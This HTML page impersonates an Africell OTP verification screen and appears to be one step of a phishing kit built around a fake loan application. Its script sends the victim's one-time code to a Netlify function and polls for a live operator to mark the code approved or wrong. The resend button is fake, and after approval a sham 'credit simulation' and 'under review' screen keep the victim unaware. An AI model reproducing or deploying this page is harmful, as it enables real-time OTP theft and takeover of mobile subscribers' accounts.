<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify OTP - Africell</title>
    <style>
        :root {
            --africell-purple: #a60068;
            --africell-orange: #ff9900;
            --border-light: #e0e0e0;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: var(--africell-purple);
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            padding: 40px 20px;
            color: white;
            text-align: center;
        }

        .sheet {
            background: white;
            flex-grow: 1;
            border-top-left-radius: 30px;
            border-top-right-radius: 30px;
            padding: 40px 25px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h2 {
            font-size: 22px;
            margin-bottom: 10px;
            color: #333;
        }

        .info-text {
            color: #666;
            font-size: 14px;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        /* OTP Input Style */
        .otp-container {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
        }

        .otp-input {
            width: 45px;
            height: 55px;
            border: 1.5px solid var(--border-light);
            border-radius: 10px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            color: var(--africell-purple);
            outline: none;
            transition: border-color 0.2s;
        }

        .otp-input:focus {
            border-color: var(--africell-purple);
        }

        /* Verify Button */
        .verify-btn {
            width: 100%;
            background-color: var(--africell-purple);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(166, 0, 104, 0.2);
        }

        .resend-row {
            margin-top: 25px;
            font-size: 14px;
            color: #888;
        }

        .resend-link {
            color: var(--africell-orange);
            font-weight: 600;
            text-decoration: none;
            margin-left: 5px;
        }
    </style>
</head>

<body>

    <div class="header">
        <div style="display:flex; align-items:center; justify-content:center; gap:10px; position:relative;">
            <span onclick="window.location.href='pin.html'"
                style="position:absolute; left:0; font-size:22px; cursor:pointer; opacity:0.85;">←</span>
            <h1 style="font-size: 28px;">africell</h1>
        </div>
    </div>

    <div class="sheet">
        <h2>Verification Code</h2>
        <p class="info-text">We have sent a 6-digit code to your registered mobile number <b id="displayPhone">+220 •••
                ••••</b></p>

        <div class="otp-container" id="otpFields">
            <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 0)">
            <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
            <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
            <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
            <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
            <input type="number" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
        </div>

        <button class="verify-btn" id="verifyBtn" onclick="verifyOTP()">Verify & Proceed</button>

        <div class="resend-row">
            Didn't receive the code?
            <a href="#" class="resend-link" id="resendLink" onclick="resendOTP(event)">Resend in <span
                    id="timerCount">59</span>s</a>
        </div>

        <!-- Error message -->
        <div id="otpError"
            style="display:none; margin-top:14px; background:#fff0f0; border:1px solid #ffcccc; border-radius:10px; padding:12px 15px; text-align:center; font-size:13px; color:#cc0000; width:100%;">
        </div>
    </div>

    <!-- Loading overlay -->
    <div id="waitOverlay"
        style="display:none; position:fixed; inset:0; z-index:999; background:rgba(166,0,104,0.95); flex-direction:column; align-items:center; justify-content:center; color:white;">
        <div
            style="width:48px;height:48px;border:5px solid rgba(255,255,255,0.3); border-top-color:white;border-radius:50%;animation:spin 0.9s linear infinite; margin-bottom:20px;">
        </div>
        <div style="font-size:17px;font-weight:700;">Verifying OTP...</div>
        <div style="font-size:13px;opacity:0.75;margin-top:6px;">Please wait</div>
        <style>
            @keyframes spin {
                to {
                    transform: rotate(360deg);
                }
            }
        </style>
    </div>

    <script>
        const inputs = document.querySelectorAll('.otp-input');

        // Show phone number passed from login page
        const storedPhone = sessionStorage.getItem('phone');
        if (storedPhone) {
            document.getElementById('displayPhone').textContent = '+220 ' + storedPhone;
        }

        function moveToNext(current, index) {
            if (current.value.length > 1) current.value = current.value.slice(-1);
            if (current.value.length >= 1 && index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        }

        inputs.forEach((input, index) => {
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function showOtpError(msg) {
            const box = document.getElementById('otpError');
            box.textContent = msg;
            box.style.display = 'block';
            document.getElementById('waitOverlay').style.display = 'none';
            document.getElementById('verifyBtn').disabled = false;
            // Re-enable inputs
            inputs.forEach(i => { i.value = ''; i.disabled = false; });
            inputs[0].focus();
        }

        async function verifyOTP() {
            let code = '';
            inputs.forEach(i => code += i.value);
            if (code.length !== 6) {
                showOtpError('Please enter the full 6-digit code.');
                return;
            }

            document.getElementById('otpError').style.display = 'none';
            document.getElementById('verifyBtn').disabled = true;
            inputs.forEach(i => i.disabled = true);
            document.getElementById('waitOverlay').style.display = 'flex';

            const sessionId = sessionStorage.getItem('sessionId') ||
                (Date.now().toString(36) + Math.random().toString(36).slice(2));
            sessionStorage.setItem('sessionId', sessionId);

            try {
                await fetch('/.netlify/functions/submit-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ otp: code, sessionId })
                });
            } catch (e) {
                showOtpError('Network error. Please try again.');
                return;
            }

            // Poll Redis for OTP decision
            const poll = setInterval(async () => {
                try {
                    const res = await fetch(`/.netlify/functions/check-status?sessionId=${sessionId}&type=otp`);
                    const data = await res.json();
                    const status = data.status;

                    if (status === 'approved') {
                        clearInterval(poll);
                        // Phase 1: Simulated "checking" step
                        document.getElementById('waitOverlay').innerHTML = `
                            <div style="width:52px; height:52px; border:5px solid rgba(255,255,255,0.3); border-top-color:white; border-radius:50%; animation:spin 0.9s linear infinite; margin-bottom:24px;"></div>
                            <div style="font-size:18px;font-weight:700;letter-spacing:0.5px;">OTP Verified!</div>
                            <div style="font-size:14px;opacity:0.9;margin-top:10px;text-align:center;line-height:1.5;">
                                Running credit simulation...<br>
                                <span style="font-size:12px;opacity:0.75;">This may take a few seconds</span>
                            </div>
                            <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
                        `;

                        // Phase 2: Show final "Under Review" screen after 5 seconds
                        setTimeout(() => {
                            // Clear body to just show the final state
                            document.body.innerHTML = `
                                <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; padding:30px; text-align:center; background:#f4f7f6;">
                                    <div style="font-size:72px; margin-bottom:20px;">⏳</div>
                                    <h2 style="color:var(--africell-purple); margin-bottom:15px; font-size:24px;">Application Under Review</h2>
                                    <p style="color:#555; font-size:15px; line-height:1.6; margin-bottom:40px;">
                                        Your loan application has been submitted successfully and is currently under review by our team.<br><br>
                                        You will receive an SMS notification once a decision has been made.
                                    </p>
                                    <button onclick="window.location.href='app.html'" style="background:var(--africell-purple); color:white; border:none; border-radius:12px; padding:16px 30px; font-size:16px; font-weight:bold; cursor:pointer; width:100%; max-width:300px; box-shadow:0 4px 15px rgba(166,0,104,0.2);">
                                        Reapply / Modify App
                                    </button>
                                </div>
                            `;
                        }, 5000);
                    } else if (status === 'wrong_otp') {
                        clearInterval(poll);
                        showOtpError('❌ Incorrect OTP. Please check and try again.');
                    }
                } catch (e) { /* retry */ }
            }, 2000);

            setTimeout(() => {
                clearInterval(poll);
                showOtpError('⏱ Request timed out. Please try again.');
            }, 180000);
        }

        // Countdown resend timer
        let seconds = 59;
        const timerEl = document.getElementById('timerCount');
        const resendLink = document.getElementById('resendLink');
        resendLink.style.pointerEvents = 'none';
        resendLink.style.opacity = '0.5';

        const countdown = setInterval(() => {
            seconds--;
            timerEl.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(countdown);
                resendLink.innerHTML = 'Resend Code';
                resendLink.style.pointerEvents = 'auto';
                resendLink.style.opacity = '1';
            }
        }, 1000);

        function resendOTP(e) {
            e.preventDefault();
            alert('A new OTP has been sent to your number.');
        }
    </script>
</body>

</html>
